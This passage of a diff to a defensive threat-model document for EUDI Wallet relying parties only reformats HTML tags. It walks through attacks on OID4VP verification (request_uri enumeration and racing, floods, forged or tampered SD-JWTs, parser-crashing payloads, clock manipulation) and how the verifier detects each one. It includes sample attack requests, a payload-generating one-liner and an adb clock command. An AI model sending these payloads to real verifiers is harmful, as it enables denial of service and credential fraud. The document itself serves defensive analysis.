+<summary><strong>1. RP generates request_uri with session identifier</strong></summary>
 
 The RP's OID4VP initiation endpoint creates a new verification session and encodes the session reference as a `request_uri` path. This path is embedded in the QR code or authorization request URL that the Wallet will scan. In a secure implementation, the path uses a cryptographically random token with ≥128 bits of entropy (e.g., `/verify/a8f3c9e7d2b1…`). In a vulnerable implementation, the path uses a predictable identifier — sequential integers (`/verify/1001`), timestamps (`/verify/1712345600`), or short random tokens with insufficient entropy (6-character hex like `/verify/3f2a1b`).
 
 **Artifact Produced:** QR code or authorization request containing the `request_uri` path.
 
 </details>
-<details><summary><strong>2. Wallet fetches JAR from request_uri endpoint</strong></summary>
+<details>
+<summary><strong>2. Wallet fetches JAR from request_uri endpoint</strong></summary>
 
 The legitimate Wallet scans the QR code and issues an HTTP GET to the `request_uri` endpoint to retrieve the signed JAR. The RP returns the JAR containing the session's `nonce`, `client_id`, requested DCQL attributes, and the RP's public key reference. This is the normal flow — the Wallet is the intended consumer of this endpoint.
 
 **Artifact Produced:** Signed JAR delivered to the Wallet for presentation request processing.
 
 </details>
-<details><summary><strong>3. RP returns signed JAR containing session metadata</strong></summary>
+<details>
+<summary><strong>3. RP returns signed JAR containing session metadata</strong></summary>
 
 The JAR returned by the `request_uri` endpoint is a JWS-signed JSON object containing session-specific metadata. While JARs are requests (not responses) and contain no user credentials, they reveal: (a) the RP's attribute collection patterns (which DCQL claims are requested); (b) active session nonces that could be correlated with other attacks; (c) the `client_id` identifying the RP; (d) the RP's verification volume and timing patterns.
 
@@ -24650,7 +25355,8 @@ The JAR returned by the `request_uri` endpoint is a JWS-signed JSON object conta
 **Artifact Produced:** JAR payload with session metadata — nonce, client_id, DCQL query structure.
 
 </details>
-<details><summary><strong>4. Attacker enumerates predictable request_uri paths</strong></summary>
+<details>
+<summary><strong>4. Attacker enumerates predictable request_uri paths</strong></summary>
 
 The attacker discovers that `request_uri` paths follow a predictable pattern — e.g., sequential integers starting from `/verify/1001`. They write a simple script to iterate through candidate paths. Each valid path returns a signed JAR; each invalid path returns `404`. The ratio of valid to invalid responses reveals the RP's active session density.
 
@@ -24665,14 +25371,16 @@ Accept: application/oauth-authz-req+jwt
 **Artifact Produced:** Enumeration script targeting predictable `request_uri` path space.
 
 </details>
-<details><summary><strong>5. Attacker harvests valid JARs containing session metadata</strong></summary>
+<details>
+<summary><strong>5. Attacker harvests valid JARs containing session metadata</strong></summary>
 
 For each valid `request_uri` path, the RP returns the full signed JAR. The attacker collects these JARs and extracts the metadata: session nonces, `client_id`, requested attributes, and timing patterns. Even though JARs contain no user credentials, the leaked metadata enables: (a) competitive intelligence (which attributes the RP requests and how often); (b) nonce harvesting (for use in combination with other vulnerabilities such as §29.2.2 Credential Replay); (c) traffic analysis (verification volume reveals business patterns).
 
 **Artifact Produced:** Collection of valid JARs from enumerated `request_uri` paths — session metadata leakage at scale.
 
 </details>
-<details><summary><strong>6. Attacker correlates harvested metadata with other attack vectors</strong></summary>
+<details>
+<summary><strong>6. Attacker correlates harvested metadata with other attack vectors</strong></summary>
 
 The harvested nonces and session identifiers may be combined with other attack vectors: replaying nonces in crafted KB-JWTs (if combined with a WRPAC key compromise, §29.2.3), timing user verification sessions for social engineering, or mapping the RP's attribute request patterns to identify high-value verification flows (e.g., KYC onboarding requests that include more attributes than routine age verification). The enumeration itself is a reconnaissance phase that enables escalation.
 
@@ -24681,7 +25389,8 @@ The harvested nonces and session identifiers may be combined with other attack v
 **Artifact Produced:** Enriched threat intelligence: RP verification patterns, active session metadata, escalation vectors.
 
 </details>
-<details><summary><strong>7. RP detects enumeration through access pattern analysis</strong></summary>
+<details>
+<summary><strong>7. RP detects enumeration through access pattern analysis</strong></summary>
 
 A well-instrumented RP detects the enumeration through anomalous access patterns: (i) high request volume from a single IP or IP range; (ii) sequential `request_uri` path patterns in the request logs; (iii) requests without valid Wallet `User-Agent` strings; (iv) multiple fetches for `request_uri` values that were never issued to any QR code. The RP rate-limits the source and generates a `REQUEST_URI_ENUMERATION_DETECTED` alert.
 
@@ -24800,7 +25509,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. RP generates QR code with request_uri for verification session</strong></summary>
+<details>
+<summary><strong>1. RP generates QR code with request_uri for verification session</strong></summary>
 
 The RP's frontend displays a QR code containing a `request_uri` that the user's Wallet will scan to initiate the OID4VP flow. The QR code is generated via a JavaScript call to the RP's session creation API, which returns the `request_uri` value. This value is typically pushed to the frontend via a WebSocket connection or embedded directly in the rendered page.
 
@@ -24825,21 +25535,24 @@ The RP's frontend displays a QR code containing a `request_uri` that the user's 
 **Artifact Produced:** QR code rendered on the RP's frontend containing the fresh `request_uri` value.
 
 </details>
-<details><summary><strong>2. User scans QR code with legitimate Wallet</strong></summary>
+<details>
+<summary><strong>2. User scans QR code with legitimate Wallet</strong></summary>
 
 The user points their Wallet at the QR code. The Wallet decodes the `request_uri` from the QR payload and prepares to issue an HTTP GET to retrieve the signed JAR. There is a natural delay between the QR code appearing on-screen and the Wallet initiating the fetch — this delay is the race window the attacker exploits.
 
 **Artifact Produced:** Decoded `request_uri` value in the Wallet's session context, pending fetch.
 
 </details>
-<details><summary><strong>3. Attacker scrapes QR code generation endpoint</strong></summary>
+<details>
+<summary><strong>3. Attacker scrapes QR code generation endpoint</strong></summary>
 
 The attacker monitors the RP's QR code generation flow. Attack vectors include: (a) scraping the RP's frontend JavaScript that constructs QR codes; (b) intercepting WebSocket messages that push new `request_uri` values to the browser; (c) observing network traffic from a shared network (e.g., same Wi-Fi at a bank branch); (d) visually capturing the QR code with a camera before the user scans it. The attacker extracts the `request_uri` value and immediately issues a competing fetch.
 
 **Artifact Produced:** Extracted `request_uri` value from the RP's QR code generation flow.
 
 </details>
-<details><summary><strong>4. Attacker races Wallet to fetch the JAR</strong></summary>
+<details>
+<summary><strong>4. Attacker races Wallet to fetch the JAR</strong></summary>
 
 The attacker issues an HTTP GET to the `request_uri` endpoint before the legitimate Wallet. The attacker's network latency is typically lower (automated script on a fast connection vs. mobile device on cellular), giving them a consistent advantage in the race condition. The RP returns the signed JAR to the attacker.
 
@@ -24853,14 +25566,16 @@ Accept: application/oauth-authz-req+jwt
 **Artifact Produced:** Signed JAR consumed by the attacker's fetch request.
 
 </details>
-<details><summary><strong>5. RP marks request_uri as consumed (single-use enforcement)</strong></summary>
+<details>
+<summary><strong>5. RP marks request_uri as consumed (single-use enforcement)</strong></summary>
 
 If the RP implements the recommended single-use semantics for `request_uri` endpoints (§11.8), the endpoint is marked as consumed after the first successful fetch. All subsequent requests for the same `request_uri` return `404 Not Found` or `410 Gone`. This is the correct security behavior — but it creates the DoS vulnerability when the first fetch is the attacker's rather than the Wallet's.
 
 **Artifact Produced:** Server-side session state updated: `request_uri_consumed: true`.
 
 </details>
-<details><summary><strong>6. Wallet's fetch fails — verification denied</strong></summary>
+<details>
+<summary><strong>6. Wallet's fetch fails — verification denied</strong></summary>
 
 The legitimate Wallet's fetch arrives after the attacker's. The RP returns `404 Not Found` because the `request_uri` has already been consumed. The Wallet cannot recover — it has no mechanism to request a new `request_uri` without the user rescanning a new QR code. The verification flow fails silently from the user's perspective: they see a generic error message with no indication that an attacker consumed the endpoint.
 
@@ -24917,7 +25632,8 @@ Content-Type: application/json
 **Artifact Produced:** HTTP 404 response to the legitimate Wallet; targeted denial of service achieved.
 
 </details>
-<details><summary><strong>7. Attacker sustains targeted DoS against specific users</strong></summary>
+<details>
+<summary><strong>7. Attacker sustains targeted DoS against specific users</strong></summary>
 
 The attacker can selectively prevent specific users from completing EUDI verification by racing their Wallet on every attempt. In a physical scenario (bank branch, government office), the attacker only needs visual access to the QR code display. In an online scenario, the attacker needs access to the QR code generation WebSocket or API endpoint. The attack is low-cost (single HTTP request per session) and difficult to distinguish from legitimate Wallet fetches without source IP analysis.
 
@@ -24993,14 +25709,16 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Normal request_uri endpoint operation</strong></summary>
+<details>
+<summary><strong>1. Normal request_uri endpoint operation</strong></summary>
 
 In normal operation, the `request_uri` endpoint handles a modest volume of requests — one per verification session. Each legitimate Wallet fetches exactly one JAR per session. The endpoint is publicly accessible without authentication because the Wallet needs to fetch the JAR without prior session context (the QR code is the only bootstrapping mechanism). This public accessibility is a structural requirement of the OID4VP protocol, not a misconfiguration.
 
 **Artifact Produced:** Normal request/response cycle: one JAR fetch per verification session.
 
 </details>
-<details><summary><strong>2. RP returns signed JAR to legitimate Wallet</strong></summary>
+<details>
+<summary><strong>2. RP returns signed JAR to legitimate Wallet</strong></summary>
 
 The RP looks up the session associated with the `request_uri` token, retrieves (or generates) the signed JAR, and returns it to the Wallet. This involves a database lookup (session store), JAR construction (JSON serialization + JWS signing), and response serialization. Each request consumes compute resources proportional to the JAR generation complexity.
 
@@ -25028,7 +25746,8 @@ IiwicmVzcG9uc2VfdXJpIjoiaHR0cHM6Ly9iYW5rLmV4YW1wbGUvYXBp...
 **Artifact Produced:** Signed JAR payload delivered to the requesting Wallet.
 
 </details>
-<details><summary><strong>3. Attacker floods request_uri endpoint with volumetric traffic</strong></summary>
+<details>
+<summary><strong>3. Attacker floods request_uri endpoint with volumetric traffic</strong></summary>
 
 The attacker directs a botnet or amplification attack at the `request_uri` endpoint. The flood consists of requests with random `request_uri` tokens — each generates a `404 Not Found` response after the RP performs a session store lookup that fails. Even though `404` responses are "cheap," the aggregate cost of session store lookups, connection handling, TLS termination, and response serialization at 10,000+ requests per second exhausts server resources.
 
@@ -25043,14 +25762,16 @@ GET /verify/aaaa0003 HTTP/1.1
 **Artifact Produced:** Volumetric flood of HTTP requests targeting the RP's `request_uri` endpoint path space.
 
 </details>
-<details><summary><strong>4. RP server resources exhausted by flood processing</strong></summary>
+<details>
+<summary><strong>4. RP server resources exhausted by flood processing</strong></summary>
 
 The RP's infrastructure — load balancer, application server, session store — becomes saturated processing the flood. Even with rate limiting enabled, the rate-limiting logic itself consumes resources (IP tracking, counter maintenance, `429` response generation). If the `request_uri` endpoint shares infrastructure with other critical services (e.g., runs on the same load balancer as the `response_uri`, the RP's main application, or the RP's API gateway), the DDoS cascades beyond the verification flow.
 
 **Artifact Produced:** Server resource exhaustion: CPU, memory, connection pool saturation on the RP's verification infrastructure.
 
 </details>
-<details><summary><strong>5. Legitimate Wallet fetch fails during flood</strong></summary>
+<details>
+<summary><strong>5. Legitimate Wallet fetch fails during flood</strong></summary>
 
 During the flood, legitimate Wallet requests to the `request_uri` endpoint either timeout (server too busy to respond within the Wallet's timeout window) or receive `503 Service Unavailable` responses. The user's verification flow fails — they cannot proceed with EUDI identity verification. In high-stakes scenarios (government ID check at a border, financial KYC onboarding), this denial of service has immediate real-world consequences.
 
@@ -25083,7 +25804,8 @@ X-Connection-Pool-Exhausted: true
 **Artifact Produced:** HTTP 503 or timeout responses to legitimate Wallet requests during the flood.
 
 </details>
-<details><summary><strong>6. Service cascade to non-verification RP services</strong></summary>
+<details>
+<summary><strong>6. Service cascade to non-verification RP services</strong></summary>
 
 If the RP's `request_uri` endpoint shares infrastructure with other services, the DDoS cascades. The RP's main website, API endpoints, payment processing, and customer portal may all degrade. Unlike a generic web DDoS, the `request_uri` endpoint cannot be hidden behind a CDN cache (each request is unique) or protected by CAPTCHA (the client is a mobile Wallet, not a browser). Standard DDoS mitigations (Cloudflare, AWS Shield) must be specifically configured for the `request_uri` endpoint's traffic pattern.
 
@@ -25157,7 +25879,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Attacker generates key pair and constructs forged credential</strong></summary>
+<details>
+<summary><strong>1. Attacker generates key pair and constructs forged credential</strong></summary>
 
 The Attacker generates a fresh ES256 key pair (or reuses a previously generated key) and constructs an SD-JWT VC payload that mimics a legitimate PID credential. The payload includes a forged `iss` claim pointing to a real Member State PID Provider (e.g., `https://pid.bund.de`), a fabricated `personal_identifier`, and selectively disclosable claims (`family_name`, `given_name`, `birth_date`). The attacker populates all required fields per the PID Rulebook schema to maximize the credential's plausibility.
 
@@ -25188,7 +25911,8 @@ The Attacker generates a fresh ES256 key pair (or reuses a previously generated 
 **Artifact Produced:** Forged SD-JWT VC body with a valid JSON structure but signed by an attacker-controlled key, not the legitimate PID Provider's key.
 
 </details>
-<details><summary><strong>2. Attacker signs forged SD-JWT with own private key</strong></summary>
+<details>
+<summary><strong>2. Attacker signs forged SD-JWT with own private key</strong></summary>
 
 The Attacker signs the constructed JWT body with their own ES256 private key. The resulting JWS has a valid JOSE structure — the `alg` header is `ES256` (matching HAIP requirements), the payload is well-formed JSON, and the signature is mathematically valid against the attacker's key. However, the signing key is not the legitimate issuer's key registered in the LoTE trust infrastructure.
 
@@ -25208,7 +25932,8 @@ The Attacker signs the constructed JWT body with their own ES256 private key. Th
 **Artifact Produced:** Structurally valid SD-JWT signed by an attacker-controlled key — the signature is mathematically correct but trust-anchored to the wrong key.
 
 </details>
-<details><summary><strong>3. Attacker submits forged VP Token to RP</strong></summary>
+<details>
+<summary><strong>3. Attacker submits forged VP Token to RP</strong></summary>
 
 The Attacker submits the forged credential as a VP Token via `direct_post` to the RP's `response_uri`. The submission includes a KB-JWT signed with a second attacker key (bound via a fabricated `cnf` claim). From the HTTP perspective, the request looks identical to a legitimate wallet submission.
 
@@ -25227,21 +25952,24 @@ vp_token=eyJhbGciOiJFUzI1NiIsInR5cCI6InZjK3NkLWp3dCJ9.eyJpc3MiOi...forged...
 **Artifact Produced:** HTTP POST to `response_uri` containing the forged VP Token and KB-JWT.
 
 </details>
-<details><summary><strong>4. RP resolves issuer claim to LoTE trust anchor</strong></summary>
+<details>
+<summary><strong>4. RP resolves issuer claim to LoTE trust anchor</strong></summary>
 
 The RP's verification pipeline extracts the `iss` claim from the JWT body and resolves it against the LoTE trust anchor cache. The LoTE lookup returns the **authentic** public key for the claimed PID Provider — the real key that the PID Provider uses to sign legitimate credentials.
 
 **Artifact Produced:** Issuer's authentic public key retrieved from the RP's LoTE cache.
 
 </details>
-<details><summary><strong>5. LoTE returns authentic issuer public key</strong></summary>
+<details>
+<summary><strong>5. LoTE returns authentic issuer public key</strong></summary>
 
 The LoTE trust anchor responds with the legitimate issuer's public key, X.509 certificate chain, or JWK Set. This is the correct key — the RP now has the material needed to verify whether the SD-JWT was actually signed by this issuer.
 
 **Artifact Produced:** Authentic issuer public key resolved from the LoTE/Trusted List hierarchy.
 
 </details>
-<details><summary><strong>6. RP verifies signature — forgery detected</strong></summary>
+<details>
+<summary><strong>6. RP verifies signature — forgery detected</strong></summary>
 
 The RP computes the JWS signature verification using the LoTE-resolved authentic public key against the JWT's signature. The verification **fails** — the signature was produced by the attacker's private key, which does not correspond to the issuer's authentic public key. The ECDSA signature check returns `false`.
 
@@ -25259,7 +25987,8 @@ const result = crypto.verify('ES256', jwtSignatureBytes, issuerKey);
 **Artifact Produced:** Signature verification failure (`SDJWT_SIG_INVALID`).
 
 </details>
-<details><summary><strong>7. RP emits S0 signal and blocks presentation</strong></summary>
+<details>
+<summary><strong>7. RP emits S0 signal and blocks presentation</strong></summary>
 
 The RP emits the `SDJWT_SIG_INVALID` signal at severity **S0 (Critical)** — the highest severity level. The VSI composition engine triggers an immediate **BLOCK** decision. The RP logs the full JWT body (without decrypting any disclosures) for forensic analysis, quarantines the source IP, and alerts the Security Operations Centre (SOC). If the RP is subject to DORA Art. 17, the incident is classified as a potential major ICT-related incident.
 
@@ -25337,7 +26066,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. PID Provider issues legitimate credential to attacker</strong></summary>
+<details>
+<summary><strong>1. PID Provider issues legitimate credential to attacker</strong></summary>
 
 The attacker obtains a legitimate SD-JWT VC from a PID Provider through the standard issuance flow. The credential contains truthful attributes — for example, `age_over_18: false` for a minor, or `nationality: "XX"` for a specific nationality. The issuer signs the JWT body, which contains SHA-256 digests of each disclosure in the `_sd` array. The disclosures are appended as Base64URL-encoded `[salt, claim_name, value]` arrays separated by `~` delimiters.
 
@@ -25359,7 +26089,8 @@ The attacker obtains a legitimate SD-JWT VC from a PID Provider through the stan
 **Artifact Produced:** Legitimate SD-JWT VC with correct disclosures matching the `_sd` digests in the issuer-signed JWT body.
 
 </details>
-<details><summary><strong>2. Attacker extracts and modifies disclosure value</strong></summary>
+<details>
+<summary><strong>2. Attacker extracts and modifies disclosure value</strong></summary>
 
 The attacker Base64URL-decodes a target disclosure (e.g., `["salt123", "age_over_18", false]`), modifies the value (`false` → `true`), and re-encodes it. The attacker cannot modify the issuer-signed JWT body (which contains the original SHA-256 digest of the unmodified disclosure) because that would invalidate the issuer's signature. The attack relies on the hope that the RP's verification pipeline will accept the modified disclosure without checking its hash against the `_sd` digest.
 
@@ -25380,14 +26111,16 @@ The attacker Base64URL-decodes a target disclosure (e.g., `["salt123", "age_over
 **Artifact Produced:** Modified disclosure with a value that no longer matches its committed digest in the JWT body.
 
 </details>
-<details><summary><strong>3. Attacker reconstructs SD-JWT with tampered disclosure</strong></summary>
+<details>
+<summary><strong>3. Attacker reconstructs SD-JWT with tampered disclosure</strong></summary>
 
 The attacker reassembles the SD-JWT string: the original issuer-signed JWT (unchanged) + the modified disclosure(s) + a KB-JWT signed with the holder's device key. The composite string is structurally valid — the `~`-delimited format is correct, the issuer signature is intact, and the KB-JWT proves holder binding. Only the disclosure content has been altered.
 
 **Artifact Produced:** Structurally valid SD-JWT VP Token where the issuer signature is authentic but one or more disclosures have been tampered with.
 
 </details>
-<details><summary><strong>4. Attacker submits tampered VP Token to RP</strong></summary>
+<details>
+<summary><strong>4. Attacker submits tampered VP Token to RP</strong></summary>
 
 The attacker submits the tampered VP Token via `direct_post` to the RP's `response_uri`. The RP begins its verification pipeline per §11.3.
 
@@ -25406,7 +26139,8 @@ vp_token=eyJhbGciOiJFUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BpZC5idW5kLmRlIi...issuer-si
 **Artifact Produced:** HTTP POST to `response_uri` containing the tampered SD-JWT VP Token.
 
 </details>
-<details><summary><strong>5. RP verifies disclosure hashes — tampering detected</strong></summary>
+<details>
+<summary><strong>5. RP verifies disclosure hashes — tampering detected</strong></summary>
 
 The RP's verification pipeline processes each disclosure: (a) Base64URL-decodes the disclosure to extract `[salt, claim_name, value]`, (b) computes `SHA-256(disclosure_base64url)`, and (c) checks whether the computed hash matches any digest in the `_sd` array of the issuer-signed JWT body. For the tampered disclosure, the computed hash does **not** match the committed digest — the SHA-256 of the modified disclosure is a completely different value from the SHA-256 of the original disclosure.
 
@@ -25429,7 +26163,8 @@ for (const disclosure of receivedDisclosures) {
 **Artifact Produced:** Disclosure hash verification failure.
 
 </details>
-<details><summary><strong>6. RP detects disclosure hash mismatch</strong></summary>
+<details>
+<summary><strong>6. RP detects disclosure hash mismatch</strong></summary>
 
 The RP's hash verification produces a mismatch: the SHA-256 digest of the tampered disclosure (`x8Q2kmp4PDf...`) does not match any entry in the `_sd` array of the issuer-signed JWT body. The original digest (`dBjftJeZ4CVP...`) was committed by the issuer over the **unmodified** disclosure — any single-bit change in the disclosure value produces a completely different SHA-256 output. The mismatch is deterministic and cannot be circumvented without breaking the issuer's JWT signature (which would be caught by §29.2.36's signature verification).
 
@@ -25438,7 +26173,8 @@ The RP's hash verification produces a mismatch: the SHA-256 digest of the tamper
 **Artifact Produced:** Disclosure hash verification failure — computed hash does not match any committed `_sd` digest.
 
 </details>
-<details><summary><strong>7. RP emits S1 signal and blocks presentation</strong></summary>
+<details>
+<summary><strong>7. RP emits S1 signal and blocks presentation</strong></summary>
 
 The RP emits `SDJWT_DISCLOSURE_HASH_MISMATCH` at severity **S1 (High)**. The VSI composition engine triggers a **BLOCK** decision. The RP logs the full SD-JWT (including the tampered disclosure) for forensic analysis — the mismatch between the disclosed value and the committed digest provides evidence of deliberate tampering (as opposed to a transmission error, which would corrupt the entire structure).
 
@@ -25511,7 +26247,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Attacker crafts weaponized VP Token payload</strong></summary>
+<details>
+<summary><strong>1. Attacker crafts weaponized VP Token payload</strong></summary>
 
 The Attacker constructs a structurally malformed payload designed to exploit specific parser vulnerabilities. Attack variants include:
 
@@ -25539,7 +26276,8 @@ python3 -c "import sys; sys.stdout.buffer.write(b'\x9f' + b'\x01' * 10_000_000 +
 **Artifact Produced:** Malformed `vp_token` payload engineered for a specific parser vulnerability class.
 
 </details>
-<details><summary><strong>2. Attacker submits payload to RP's response_uri</strong></summary>
+<details>
+<summary><strong>2. Attacker submits payload to RP's response_uri</strong></summary>
 
 The Attacker submits the weaponized payload via `direct_post` to the RP's `response_uri`. The HTTP request is structurally valid — correct content type, correct form parameters — only the `vp_token` value itself is malformed. The request passes through the API gateway's standard HTTP parsing without issue because the malformation is within the application-layer payload, not the HTTP structure.
 
@@ -25556,14 +26294,16 @@ vp_token={"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":... (10,000 levels) .
 **Artifact Produced:** HTTP POST to `response_uri` with a malformed `vp_token` form parameter.
 
 </details>
-<details><summary><strong>3. API gateway forwards payload to verification SDK</strong></summary>
+<details>
+<summary><strong>3. API gateway forwards payload to verification SDK</strong></summary>
 
 The RP's API gateway (§26.6.4) forwards the `vp_token` value to the verification SDK for processing. The gateway does not perform deep inspection of the VP Token structure — format validation is the SDK's responsibility.
 
 **Artifact Produced:** Raw `vp_token` string passed to the verification pipeline.
 
 </details>
-<details><summary><strong>4. Parser attempts to decode malformed structure</strong></summary>
+<details>
+<summary><strong>4. Parser attempts to decode malformed structure</strong></summary>
 
 The verification SDK begins parsing the VP Token: for SD-JWT, it splits on `~` delimiters, Base64URL-decodes each segment, and JSON-parses the JWT body and disclosures. For mdoc, it CBOR-decodes the `DeviceResponse` structure. The malformed payload triggers the targeted vulnerability during this parsing phase — before any cryptographic verification occurs.
 
@@ -25572,7 +26312,8 @@ The verification SDK begins parsing the VP Token: for SD-JWT, it splits on `~` d
 **Artifact Produced:** Parser enters vulnerable code path.
 
 </details>
-<details><summary><strong>5. Parser crashes or enters resource exhaustion</strong></summary>
+<details>
+<summary><strong>5. Parser crashes or enters resource exhaustion</strong></summary>
 
 The parser vulnerability manifests as one of: (a) **stack overflow** — recursive parser exceeds stack depth, process crashes with SIGSEGV; (b) **heap exhaustion** — parser allocates unbounded memory for deeply nested or indefinite-length structures, process killed by OOM killer; (c) **ReDoS hang** — regex evaluation enters catastrophic backtracking, thread hangs for minutes consuming 100% CPU; (d) **buffer over-read** — invalid Base64URL padding causes read beyond buffer boundary, potentially leaking adjacent memory (Heartbleed-class). In all cases, the RP's verification service is degraded or unavailable.
 
@@ -25595,7 +26336,8 @@ The parser vulnerability manifests as one of: (a) **stack overflow** — recursi
 **Artifact Produced:** Service crash, OOM kill, or thread hang on the RP's verification infrastructure.
 
 </details>
-<details><summary><strong>6. Gateway receives error response from crashed SDK</strong></summary>
+<details>
+<summary><strong>6. Gateway receives error response from crashed SDK</strong></summary>
 
 The API gateway observes the SDK's failure as an HTTP error or connection anomaly. Depending on the failure mode: (a) **process death** — the SDK process terminates, the gateway receives a TCP connection reset and returns `502 Bad Gateway` to the caller; (b) **timeout** — the SDK hangs (ReDoS or infinite allocation loop), the gateway's upstream timeout fires and returns `504 Gateway Timeout`; (c) **graceful rejection** — a well-hardened SDK catches the parse error, emits `SDJWT_JSON_PARSE_ERROR` or `MDOC_CBOR_PARSE_ERROR`, and returns `400 Bad Request`. In cases (a) and (b), the attacker achieves denial of service — legitimate Wallet submissions to the same endpoint also fail while the SDK is down or restarting. In case (c), the individual request is rejected without service disruption.
 
@@ -25670,7 +26412,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Rogue/misconfigured issuer issues credential without device binding</strong></summary>
+<details>
+<summary><strong>1. Rogue/misconfigured issuer issues credential without device binding</strong></summary>
 
 A PID Provider or QEAA Provider — either malicious, misconfigured, or operating under a lax policy — issues an SD-JWT VC without including the `cnf` (confirmation) claim in the issuer-signed JWT body. The `cnf` claim normally contains the holder's device public key (`jwk` or `kid`), which binds the credential to a specific device. Without `cnf`, the credential has no cryptographic linkage to any particular device or wallet instance.
 
@@ -25696,14 +26439,16 @@ A PID Provider or QEAA Provider — either malicious, misconfigured, or operatin
 **Artifact Produced:** SD-JWT VC with a valid issuer signature but no `cnf` claim — the credential is a "bearer token" that anyone who possesses the raw bytes can present.
 
 </details>
-<details><summary><strong>2. Credential holder forwards credential to attacker</strong></summary>
+<details>
+<summary><strong>2. Credential holder forwards credential to attacker</strong></summary>
 
 Because the credential has no device binding, the holder can forward it to any third party through any channel: screenshot, file transfer, email, QR code, or even published on a marketplace. Unlike a properly bound credential (where the attacker would need the holder's device private key to produce a valid KB-JWT), an unbound credential can be used by anyone who receives the raw SD-JWT string.
 
 **Artifact Produced:** Raw SD-JWT VC bytes transferred to the attacker through an out-of-band channel.
 
 </details>
-<details><summary><strong>3. Attacker presents forwarded credential to RP</strong></summary>
+<details>
+<summary><strong>3. Attacker presents forwarded credential to RP</strong></summary>
 
 The attacker submits the forwarded credential to the RP via `direct_post`. Since there is no `cnf` claim, the attacker cannot produce a KB-JWT (there is no device key to sign with). The submission contains only the issuer-signed JWT + disclosures, without the trailing KB-JWT segment.
 
@@ -25722,7 +26467,8 @@ vp_token=eyJhbGciOiJFUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BpZC5leGFtcGxlLmV1Ii...issue
 **Artifact Produced:** HTTP POST to `response_uri` containing an SD-JWT VP Token without a KB-JWT component.
 
 </details>
-<details><summary><strong>4. RP detects missing device binding</strong></summary>
+<details>
+<summary><strong>4. RP detects missing device binding</strong></summary>
 
 The RP's verification pipeline checks for the `cnf` claim in the issuer-signed JWT body (§11.3 step 2). The claim is absent — the credential was issued without device binding. This is distinct from §29.2.2 (Credential Replay) where `cnf` exists but the KB-JWT is missing or invalid — here, the issuer itself did not bind the credential to any device.
 
@@ -25742,7 +26488,8 @@ if (!cnf) {
 **Artifact Produced:** Missing `cnf` claim detection.
 
 </details>
-<details><summary><strong>5. RP emits S1 signal and blocks or downgrades LoA</strong></summary>
+<details>
+<summary><strong>5. RP emits S1 signal and blocks or downgrades LoA</strong></summary>
 
 The RP emits `SDJWT_CNF_MISSING` at severity **S1 (High)**. The appropriate response depends on the RP's risk policy: (a) **BLOCK** — refuse the credential entirely, as unbound credentials provide no holder binding assurance; (b) **Downgrade LoA** — accept the credential but reduce the Level of Assurance to "Low" (unbound), preventing its use for high-assurance operations (§22 KYC, §15 SCA). The RP logs the issuer's `iss` claim — if a legitimate PID Provider is issuing credentials without `cnf`, this warrants an incident report to the Member State's supervisory authority.
 
@@ -25816,7 +26563,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Attacker configures emulated environment with future clock</strong></summary>
+<details>
+<summary><strong>1. Attacker configures emulated environment with future clock</strong></summary>
 
 The attacker sets up an emulated or rooted device with a system clock deliberately set to a future date. This could be an Android emulator running on a desktop, a rooted physical device with NTP disabled and manual clock configuration, or a virtual machine with guest time manipulation. The future-dated clock affects all system-level time operations, including the `iat` (issued-at) timestamp that PID Providers embed in credentials during issuance.
 
@@ -25833,14 +26581,16 @@ adb shell su -c "date -s 2027-01-01T00:00:00"
 **Artifact Produced:** Emulated wallet environment with a manipulated system clock.
 
 </details>
-<details><summary><strong>2. Attacker requests credential from emulated environment</strong></summary>
+<details>
+<summary><strong>2. Attacker requests credential from emulated environment</strong></summary>
 
 The attacker initiates the standard PID issuance flow from the emulated wallet. If the PID Provider's issuance protocol relies on the client's system time for the `iat` claim (rather than the server's own clock), the resulting credential will carry a future-dated `iat`. Even if the PID Provider uses its own server time, the emulated environment may generate a KB-JWT or device attestation with future timestamps, creating a temporal inconsistency.
 
 **Artifact Produced:** Credential issuance request from an environment with abnormal temporal characteristics.
 
 </details>
-<details><summary><strong>3. PID Provider issues credential with future iat</strong></summary>
+<details>
+<summary><strong>3. PID Provider issues credential with future iat</strong></summary>
 
 The PID Provider issues the SD-JWT VC. If the provider uses the client-reported time or if the emulated environment interferes with the issuance protocol's time synchronisation, the `iat` claim is set to the future date (e.g., `2027-01-01T00:00:00Z`). The credential's issuer signature is cryptographically valid — the `iat` value is part of the signed payload, but its temporal plausibility is not cryptographically enforced.
 
@@ -25863,14 +26613,16 @@ The PID Provider issues the SD-JWT VC. If the provider uses the client-reported 
 **Artifact Produced:** SD-JWT VC with cryptographically valid signature but temporally implausible `iat` claim.
 
 </details>
-<details><summary><strong>4. Attacker resets clock and prepares credential for presentation</strong></summary>
+<details>
+<summary><strong>4. Attacker resets clock and prepares credential for presentation</strong></summary>
 
 The attacker resets the emulated environment's system clock back to the present time. The credential, now carrying a future-dated `iat`, remains valid — its issuer signature was computed over the JWT body (which includes `iat`) and is independent of the presenting device's clock. The attacker now possesses a cryptographically valid credential with a temporal anomaly: the `iat` timestamp is months or years ahead of any legitimate issuance date.
 
 **Artifact Produced:** Emulated environment with clock restored to present, holding a credential with a future-dated `iat`.
 
 </details>
-<details><summary><strong>5. Attacker submits VP Token to RP via direct_post</strong></summary>
+<details>
+<summary><strong>5. Attacker submits VP Token to RP via direct_post</strong></summary>
 
 The attacker submits the VP Token containing the future-dated credential to the RP via `direct_post`. The submission is structurally identical to a legitimate wallet submission — the issuer signature is valid, the KB-JWT is correctly bound, and the disclosures are intact. The temporal anomaly is embedded within the `iat` claim inside the issuer-signed JWT body.
 
@@ -25888,7 +26640,8 @@ vp_token=eyJhbGciOiJFUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BpZC5idW5kLmRlIi...
 **Artifact Produced:** VP Token submission with a future-dated `iat` claim.
 
 </details>
-<details><summary><strong>6. RP detects future-dated iat</strong></summary>
+<details>
+<summary><strong>6. RP detects future-dated iat</strong></summary>
 
